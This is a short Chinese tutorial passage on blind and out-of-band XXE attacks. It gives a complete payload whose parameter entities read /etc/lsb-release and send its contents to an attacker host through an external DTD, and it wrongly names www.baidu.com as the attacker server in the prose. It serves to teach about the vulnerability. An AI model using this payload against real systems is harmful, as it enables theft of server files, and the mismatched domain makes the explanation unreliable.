### Blind XXE 与 OOB-XXE

一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象（**带内** [XML外部实体（XXE](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/)），即攻击者可以发送带有XXE有效负载的请求并从包含某些数据的Web应用程序获取响应），无回显的情况又称为blind xxe，可以使用外带数据通道提取数据即带外XML外部实体（OOB-XXE）。

以下是攻击者如何利用参数实体使用带外（OOB）技术窃取数据的示例。

request:

```bash
POST http://example.com/xml HTTP/1.1

<!DOCTYPE data [
  <!ENTITY % file SYSTEM
  "file:///etc/lsb-release">
  <!ENTITY % dtd SYSTEM
  "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>

```

攻击者DTD

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
%all;

```

XML解析器将首先处理`%file`加载文件的参数实体`/etc/lsb-release`。接下来，XML解析器将在**http://www.baidu.com/evil.dtd**向攻击者的DTD发出请求。

一旦处理了攻击者的DTD，`all%`参数实体将创建一个名为**＆send**的**通用**实体**;** ，其中包含一个包含文件内容的URL（例如http://www.baidu.com/?collect=DISTRIB_ID=Ubuntu …）。最后，一旦URL构造的`&send`; 实体由解析器处理，解析器向攻击者的服务器发出请求。然后，攻击者可以在其结尾处记录请求，并从记录的请求中重建文件的内容。

